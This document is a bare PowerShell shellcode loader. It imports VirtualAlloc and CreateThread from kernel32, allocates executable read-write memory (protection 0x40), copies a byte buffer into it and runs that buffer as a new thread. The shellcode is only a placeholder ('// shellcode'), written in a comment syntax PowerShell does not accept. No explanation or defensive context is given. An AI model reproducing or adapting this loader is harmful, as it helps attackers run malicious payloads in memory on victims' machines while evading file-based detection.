$user32 = @"
using System;
using System.Runtime.InteropServices;


public class Kernel32 {


 [DllImport("kernel32")]
 
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint 
flAllocationType, uint flProtect);

 [DllImport("kernel32", CharSet=CharSet.Ansi)]
 
 public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint 
dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr 
lpThreadId);


}

"@

[Byte[]] $buf = // shellcode
$size = $buf.Length
Add-Type $user32
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
